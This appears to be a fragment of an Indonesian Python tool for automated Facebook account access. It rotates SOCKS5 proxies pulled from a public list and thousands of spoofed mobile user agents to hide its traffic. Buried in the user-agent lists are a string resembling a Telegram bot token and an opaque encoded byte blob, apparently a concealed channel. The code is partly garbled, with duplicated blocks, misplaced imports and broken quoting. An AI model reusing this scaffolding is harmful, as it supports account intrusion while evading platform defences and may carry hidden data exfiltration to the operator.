(KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']

###---[ AUTO CREATE UA & PROXY ]---###
try:
	clear_layar()
	print(logo2())
	print(f'\r\n [!] Sedang Dump Proxy Dan Create Useragent')
	try:os.remove('.proxy.txt')
	except:pass
#	A = ''
#	one = ses.get('https://spys.me/socks.txt').text
#	for x in one.splitlines():
#		if '+' in x:
#			if '.' in x:
#				p = x.split(' ')[0]
#				A += '\n'+p
	uno = ses.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text
	open('.proxy.txt','w').write(uno)
except requests.exceptions.ConnectionError:
	sys.exit(f" [{M}>{P}] Tidak Ada Koneksi Internet")
for xd in range(10000):
	a='Mozilla/5.0; Profile/MIDP-2.1'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia5250'
	e=random.randrange(100, 9999)
	f='/10.0.011 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/525 3gpp-gba'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

	aa='Mozilla/5.0 (iPhone14,'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='U; CPU iPhone OS 15_4 like Mac OS X'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/602.1.50 (KHTML, like Gecko) Version/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/19E241 Safari/602.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	###-------[RANDOM USER AGENT]-------###
ua = random.choice(['Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0; iCherry C233 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-E5260) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4438.149 Mobile Safari/537.36'



###----------[ IMPORT LIBRARY ]---------- ###
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from rich import print as printer
from rich.panel import Panel
from urllib.parse import quote

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'

###----------[ USER AGENT ]---------- ###
ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'

# KUMPULAN USER AGNET
ua01= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua02= ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
ua03= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]",b"\xaaJ\xdb\x81\x01\xfc\xa4\xcaG\xd8\x01\xca.(\x91\xa9c\xafb\xa6\xa6\x94/\xad\x82\x94\x84`\xd0\xbb\xe2\xaf\xe2\xba&\xb80s\xedl\xf5=C\x8caN\xdc0;$\xf0\xae&\xc7\xaeq7U\x8b\r[\x8cg\xd3\x88\xd74\xb8\x07\x9b2\x13\x95\\\xe3/N\x02\xfb@\xee/\x9c\x81\x1e(\x18\xec\xcd;\xab+M\xdb\x9a\xd3\xf9\xf4\x18#[@\xa4\xf0\xae\xb5\xfdZ\x07}\xa9\xff=\xa6\x14\xa4\r\x87@\xbb\xda\x04\xbd\xf6[\x14\x8f\x88Q\xed;\xc5\x9e2e`\xe5\xc7~~\x03\xf4\xb8\x12\n\xa4[\xd5R\xa5\x94(?l\x94\x0be$/K\xfc\x0c0\x83\x0eIN%\x9cx","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
ua04= ["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","5353538250:AAEy8dG0bzRX2mxgLoGJqWYcqk9fKok_Sjg","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405","Mozilla/5.0 (Linux; Android 10; Nokia 7.2 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]"]
